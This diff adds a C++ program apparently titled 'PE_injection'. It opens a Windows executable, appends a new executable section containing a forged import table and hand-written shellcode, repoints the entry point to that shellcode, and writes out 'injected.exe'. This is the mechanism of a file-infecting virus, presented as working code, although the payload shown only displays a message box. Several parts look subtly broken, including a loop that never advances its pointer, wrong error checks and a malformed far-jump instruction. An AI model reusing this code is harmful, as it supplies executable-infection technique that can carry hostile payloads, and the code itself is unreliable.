@@ -1,0 +1,280 @@
+#include <Windows.h>
+#include <stdio.h>
+#include <cstdlib>
+#include <type_traits>
+#include <wchar.h>
+wchar_t hello[] = L"Hello World";
+wchar_t caption[] = L"Caption";
+
+char * rawOffsetScanning(char * source, DWORD va, DWORD numberOfSection, PIMAGE_SECTION_HEADER psh) {
+	for (DWORD i = 0; i < numberOfSection; i++) {
+		PIMAGE_SECTION_HEADER tmp = (PIMAGE_SECTION_HEADER)((char*)psh + sizeof(IMAGE_SECTION_HEADER)*i);
+		if (tmp->VirtualAddress < va && tmp->VirtualAddress + tmp->Misc.VirtualSize > va)
+			return source + tmp->PointerToRawData + va - tmp->VirtualAddress;
+	}
+	return NULL;
+}
+
+int main(int argc, char* argv[]) {
+
+	if (argc < 2) {
+		printf("Usage: PE_injection <filename>\n");
+		return 0;
+	}
+	
+	//MessageBox(NULL, hello, caption, 0);
+	wchar_t filename[50];
+	
+	MultiByteToWideChar(CP_OEMCP, 0, argv[1], -1, filename, strlen(argv[1]) + 1);
+	HANDLE hFile = CreateFile(filename, 
+		GENERIC_READ, 
+		FILE_SHARE_READ, 
+		NULL,
+		OPEN_EXISTING, 
+		NULL, 
+		NULL);
+	if (hFile == NULL) {
+		printf("File not found\n");
+		return 0;
+	}
+	DWORD fileSize = GetFileSize(hFile, NULL);
+	char * data = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize);
+	if (data == NULL) {
+		printf("HeapAlloc error\n");
+		return 0;
+	}
+	if (!ReadFile(hFile, data, fileSize, NULL, NULL)) {
+		printf("ReadFile error\n");
+		return 0;
+	}
+	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)data;
+	PIMAGE_NT_HEADERS tmp_pNTHeader = (PIMAGE_NT_HEADERS)((char*)data + pDosHeader->e_lfanew);
+	WORD magic = tmp_pNTHeader->OptionalHeader.Magic;
+	WORD bits;
+	
+	if (magic == 0x10b) bits = 32;
+	else bits = 64;
+	if (bits == 32) {
+		PIMAGE_NT_HEADERS32 pNTHeader = (PIMAGE_NT_HEADERS32)((char*)data + pDosHeader->e_lfanew);
+		PIMAGE_OPTIONAL_HEADER32 pOptionalHeader = &pNTHeader->OptionalHeader;
+		PIMAGE_FILE_HEADER pFileHeader = &pNTHeader->FileHeader;
+		PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((char*)pNTHeader
+			+ sizeof(IMAGE_NT_HEADERS32));
+		DWORD numberOfSectionHeader = pFileHeader->NumberOfSections;
+		char* importTable = NULL;
+
+		importTable = rawOffsetScanning(data, pOptionalHeader->DataDirectory[1].VirtualAddress,
+			numberOfSectionHeader,
+			pSectionHeader);
+
+		
+		if (importTable == NULL) {
+			printf("Error parsing import table\n");
+			return 0;
+		}
+
+		bool hasUser32DLL = false;
+		bool hasMessageBox = false;
+		DWORD numberOfDLL = 0;
+		DWORD numberOfUser32Import = 0;
+
+		PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)importTable;
+		while (pImportDescriptor->Characteristics != NULL) {
+			numberOfDLL++;
+			DWORD* pImportLookupTable = (DWORD*)rawOffsetScanning(data,
+				pImportDescriptor->OriginalFirstThunk,
+				numberOfSectionHeader,
+				pSectionHeader);
+			char* dllName = rawOffsetScanning(data,
+				pImportDescriptor->Name,
+				numberOfSectionHeader,
+				pSectionHeader);
+			if (!strcmp(dllName, "USER32.dll")) {
+				hasUser32DLL = true;
+				while (*pImportLookupTable != 0) {
+					numberOfUser32Import++;
+					if ((*pImportLookupTable & 0x80000000) &&
+						((*pImportLookupTable & 0xffff) == 0x28f)) hasMessageBox = true;
+					if (!(*pImportLookupTable & 0x80000000)) {
+						char* importFunction = (char*)rawOffsetScanning(data,
+							*pImportLookupTable & (0x8fffffff),
+							numberOfSectionHeader,
+							pSectionHeader);
+						importFunction += 2;
+						if (!strcmp(importFunction, "MessageBoxW")) hasMessageBox = true;
+					}
+
+				}
+
+			}
+
+			pImportDescriptor++;
+		}
+		printf("has User32.dll: %d\n", (int)hasUser32DLL);
+		printf("has MessageBoxW: %d\n", (int)hasMessageBox);
+
+		if (!hasUser32DLL) {
+
+			DWORD numberOfBytesWritten;
+			// get original .idata, create some useful iformation
+			DWORD idataSectionRVA;
+			DWORD idataSectionRawA;
+			DWORD idataVSize;
+			DWORD idataRSize;
+			for (int i = 0; i < numberOfSectionHeader; i++) {
+				PIMAGE_SECTION_HEADER tmp = pSectionHeader + i;
+				if (tmp->VirtualAddress < pOptionalHeader->DataDirectory[1].VirtualAddress &&
+					tmp->VirtualAddress + tmp->Misc.VirtualSize > pOptionalHeader->DataDirectory[1].VirtualAddress) {
+					idataSectionRVA = tmp->VirtualAddress;
+					idataVSize = tmp->Misc.VirtualSize;
+					idataRSize = tmp->SizeOfRawData;
+					idataSectionRawA = tmp->PointerToRawData;
+				}
+
+			}
+
+			DWORD injectedSectionVSize = idataVSize + 50 * pOptionalHeader->SectionAlignment;
+			DWORD injectedSectionRSize = idataRSize + 50 * pOptionalHeader->FileAlignment;
+
+			// copy DOS header and NT header, add 1 to numberOfSectionHeader
+			IMAGE_DOS_HEADER injectedDosHeader = *pDosHeader;
+			IMAGE_NT_HEADERS32 injectedNTHeader = *pNTHeader;
+			DWORD injectedSectionRVA = (pSectionHeader + pFileHeader->NumberOfSections - 1)->VirtualAddress +
+				(pSectionHeader + pFileHeader->NumberOfSections - 1)->Misc.VirtualSize;
+			while (injectedSectionRVA % injectedNTHeader.OptionalHeader.SectionAlignment != 0) injectedSectionRVA += 1;
+			injectedNTHeader.FileHeader.NumberOfSections += 1;
+
+			// copy section header table and inject 1 more section
+			char * pInjectedSectionHeaderTable = (char *)HeapAlloc(GetProcessHeap(),
+				HEAP_ZERO_MEMORY,
+				injectedNTHeader.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER));
+
+			CopyMemory(pInjectedSectionHeaderTable,
+				pSectionHeader,
+				sizeof(IMAGE_SECTION_HEADER) * (pNTHeader->FileHeader.NumberOfSections));
+			
+			IMAGE_SECTION_HEADER injectedSectionHeader;
+			injectedSectionHeader.VirtualAddress = injectedSectionRVA;
+			injectedSectionHeader.Misc.VirtualSize = injectedSectionVSize;
+			injectedSectionHeader.SizeOfRawData = injectedSectionRSize;
+			injectedSectionHeader.PointerToRawData = (pSectionHeader + pFileHeader->NumberOfSections - 1)->PointerToRawData +
+				(pSectionHeader + pFileHeader->NumberOfSections - 1)->SizeOfRawData;
+			injectedSectionHeader.PointerToRelocations = 0;
+			injectedSectionHeader.PointerToLinenumbers = 0;
+			injectedSectionHeader.NumberOfLinenumbers = 0;
+			injectedSectionHeader.NumberOfRelocations = 0;
+			injectedSectionHeader.Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;
+			CopyMemory((char*)(pInjectedSectionHeaderTable + (injectedNTHeader.FileHeader.NumberOfSections - 1) * sizeof(IMAGE_SECTION_HEADER)),
+				&injectedSectionHeader, sizeof(IMAGE_SECTION_HEADER));
+			//set Import Directory POinter to injected .idata
+			DWORD oldImportRVA = pNTHeader->OptionalHeader.DataDirectory[1].VirtualAddress;
+			
+			injectedNTHeader.OptionalHeader.DataDirectory[1].VirtualAddress = injectedSectionHeader.VirtualAddress +
+				oldImportRVA - idataSectionRVA;
+			//printf("%x\n", injectedNTHeader.OptionalHeader.DataDirectory[1].VirtualAddress);
+			//injected .idata (XXXXX)
+			char* dynamicPtr = data + idataSectionRawA;
+			char* fakeSection = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, injectedSectionRSize);
+			char* fakeSectionOffset = fakeSection;
+			CopyMemory((char*)fakeSectionOffset, (char*)dynamicPtr, oldImportRVA - idataSectionRVA); //old data before import directory
+
+			dynamicPtr = dynamicPtr + oldImportRVA - idataSectionRVA;
+			fakeSectionOffset = fakeSection + oldImportRVA - idataSectionRVA;
+			do {
+				CopyMemory(fakeSectionOffset, dynamicPtr, sizeof(IMAGE_IMPORT_DESCRIPTOR));
+				fakeSectionOffset += sizeof(IMAGE_IMPORT_DESCRIPTOR);
+				dynamicPtr += sizeof(IMAGE_IMPORT_DESCRIPTOR);
+
+			} while (((PIMAGE_IMPORT_DESCRIPTOR)dynamicPtr)->Characteristics != NULL);
+
+			// don't need to fix other Import Lookup table. Just keep old RVA.
+			PIMAGE_IMPORT_DESCRIPTOR pInjectedDLLdescriptor = (PIMAGE_IMPORT_DESCRIPTOR)fakeSectionOffset;
+			while (((DWORD)fakeSectionOffset - (DWORD)fakeSection) % 4 != 0) fakeSectionOffset++;
+			DWORD injectedLookupRVA = (DWORD)fakeSectionOffset - (DWORD)fakeSection +
+				injectedSectionHeader.VirtualAddress +
+				2 * sizeof(IMAGE_IMPORT_DESCRIPTOR); // Import Directory Table has 1 entry + 1 NULL entry, each entry has 4 byte
+			pInjectedDLLdescriptor->Characteristics = injectedLookupRVA;
+			pInjectedDLLdescriptor->TimeDateStamp = 0;
+			pInjectedDLLdescriptor->ForwarderChain = 0;
+			pInjectedDLLdescriptor->Name = injectedSectionHeader.VirtualAddress +
+				(DWORD)fakeSectionOffset -
+				(DWORD)fakeSection + 500;
+			pInjectedDLLdescriptor->FirstThunk = injectedLookupRVA + 2 * 4; //Import Lookup Table has 1 entry for MessageBoxW + NULL
+			DWORD* messageBoxWEntry = (DWORD*)(fakeSectionOffset + 2 * sizeof(IMAGE_IMPORT_DESCRIPTOR));
+			
+			*messageBoxWEntry = (injectedSectionHeader.VirtualAddress +
+				(DWORD)fakeSectionOffset -
+				(DWORD)fakeSection +
+				500 + strlen("USER32.dll\0") + 1);
+			//*messageBoxWEntry |= 0x2f8;
+			CopyMemory(fakeSection + ((DWORD)fakeSectionOffset - (DWORD)fakeSection) + 500, "USER32.dll\0", 11);
+			CopyMemory(fakeSection + ((DWORD)fakeSectionOffset - (DWORD)fakeSection) + 500 + 11, "\xf8\x02MessageBoxW\0\0", 15);
+			CopyMemory(fakeSection + ((DWORD)fakeSectionOffset - (DWORD)fakeSection) + 500 + 11 + 15, (char*)hello, wcslen(hello));
+			CopyMemory(fakeSection + ((DWORD)fakeSectionOffset - (DWORD)fakeSection) + 500 + 11 + 15 + wcslen(hello), (char*)caption, wcslen(caption));
+			DWORD messageBoxWIAT = pInjectedDLLdescriptor->FirstThunk; // first DWORD of FirstThunk
+			*(DWORD*)(fakeSection + messageBoxWIAT - injectedSectionHeader.VirtualAddress) = *messageBoxWEntry;
+			DWORD helloRVA = injectedSectionHeader.VirtualAddress +
+				(DWORD)fakeSectionOffset - (DWORD)fakeSection +
+				500 + 11 + 15;
+			DWORD captionRVA = injectedSectionHeader.VirtualAddress +
+				(DWORD)fakeSectionOffset - (DWORD)fakeSection +
+				500 + 11 + 15 + wcslen(hello);
+			char* shellcode = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 100);
+			CopyMemory(shellcode, "\x6a\x00", 2);
+			CopyMemory(shellcode + 2, "\x68", 1);
+			*(DWORD*)(shellcode + 3) = captionRVA + injectedNTHeader.OptionalHeader.ImageBase;
+			CopyMemory(shellcode + 7, "\x68", 1);
+			*(DWORD*)(shellcode + 8) = helloRVA + injectedNTHeader.OptionalHeader.ImageBase;
+			CopyMemory(shellcode + 12, "\x6a\x00", 2);
+			CopyMemory(shellcode + 14, "\xa1", 1);
+			*(DWORD*)(shellcode + 15) = messageBoxWIAT + injectedNTHeader.OptionalHeader.ImageBase;
+			CopyMemory(shellcode + 19, "\xff\xd0", 2);
+			DWORD oldEntryPoint = injectedNTHeader.OptionalHeader.AddressOfEntryPoint + injectedNTHeader.OptionalHeader.ImageBase;
+			CopyMemory(shellcode + 21, "\xea", 1);
+			*(DWORD*)(shellcode + 22) = oldEntryPoint;
+
+			CopyMemory(fakeSectionOffset + 1000, shellcode, 26);
+			DWORD newEntryPoint = injectedSectionRVA + (DWORD)fakeSectionOffset - (DWORD)fakeSection + 1000;
+			injectedNTHeader.OptionalHeader.AddressOfEntryPoint = newEntryPoint;
+			
+			// fix header 
+
+			//
+			// new file
+			HANDLE injectedFile = CreateFile(L"injected.exe",
+				GENERIC_WRITE,
+				0,
+				NULL,
+				CREATE_NEW,
+				NULL,
+				NULL);
+
+			printf("Begin to write\n");
+			WriteFile(injectedFile, &injectedDosHeader, sizeof(injectedDosHeader), &numberOfBytesWritten, NULL);
+			WriteFile(injectedFile, 
+				data + sizeof(injectedDosHeader), 
+				(DWORD)injectedDosHeader.e_lfanew - sizeof(injectedDosHeader), 
+				&numberOfBytesWritten, NULL);
+			printf("%x\n", injectedNTHeader.OptionalHeader.DataDirectory[1].VirtualAddress);
+			WriteFile(injectedFile, &injectedNTHeader, sizeof(injectedNTHeader), &numberOfBytesWritten, NULL);
+			WriteFile(injectedFile, (char*)pSectionHeader, sizeof(IMAGE_SECTION_HEADER) * pNTHeader->FileHeader.NumberOfSections, &numberOfBytesWritten, NULL);
+			WriteFile(injectedFile, &injectedSectionHeader, sizeof(IMAGE_SECTION_HEADER), &numberOfBytesWritten, NULL);
+			while (SetFilePointer(injectedFile, 0, NULL, FILE_CURRENT) < injectedNTHeader.OptionalHeader.SizeOfHeaders) {
+				WriteFile(injectedFile, "\x00", 1, &numberOfBytesWritten, NULL);
+			}
+				// write section header table later
+			for (int i = 0; i < pNTHeader->FileHeader.NumberOfSections; i++) {
+				WriteFile(injectedFile,
+					data + (pSectionHeader + i)->PointerToRawData,
+					(pSectionHeader + i)->SizeOfRawData,
+					&numberOfBytesWritten, NULL
+				);
+			}
+			WriteFile(injectedFile, fakeSection, injectedSectionRSize, &numberOfBytesWritten, NULL);
+
+
+			
+			CloseHandle(injectedFile);
+		}
+	}
+}
